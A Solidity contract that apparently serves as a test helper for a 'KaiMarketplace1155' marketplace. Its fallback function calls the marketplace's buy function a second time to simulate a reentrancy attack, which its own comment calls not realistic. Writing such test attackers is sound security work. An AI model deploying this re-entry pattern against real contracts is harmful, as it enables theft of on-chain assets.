// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IKaiMarketplace1155 {
    function buy(uint256 listingId, uint256 quantity) external;
}

contract ReentrancyAttack {
    IKaiMarketplace1155 public marketplace;
    bool public hasAttacked;

    constructor(address _marketplace) {
        marketplace = IKaiMarketplace1155(_marketplace);
    }

    function attackReentrancy() external {
        // Call first
        marketplace.buy(0, 1);
    }

    // This simulates a callback like a reentrancy attack (not realistic, but mimics the re-entry logic).
    fallback() external {
        if (!hasAttacked) {
            hasAttacked = true;
            marketplace.buy(0, 1); // call buy again
        }
    }
}
